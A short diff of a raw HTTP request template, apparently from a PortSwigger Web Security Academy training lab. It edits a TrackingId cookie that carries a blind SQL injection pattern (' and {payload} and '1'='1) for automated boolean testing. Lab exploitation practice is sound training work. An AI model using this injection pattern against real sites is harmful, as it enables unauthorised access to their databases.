@@ -1,6 +1,6 @@
-GET /product?productId=2 HTTP/1.1
+GET / HTTP/1.1
 Host: 0a71006803b7d36283d03ccb0039009c.web-security-academy.net
-Cookie: TrackingId=XN76iA2kiYP0jZi4'+and+{payload}+and+'1'='1; session=CD9BkaYNOFKpFN2vVS10uZNxzwMfvVZd
+Cookie: TrackingId=o498NgWCtwWqKF84'+and+{payload}+and+'1'='1; session=CD9BkaYNOFKpFN2vVS10uZNxzwMfvVZd
 Sec-Ch-Ua: "Chromium";v="117", "Not;A=Brand";v="8"
 Sec-Ch-Ua-Mobile: ?0
 Sec-Ch-Ua-Platform: "Windows"
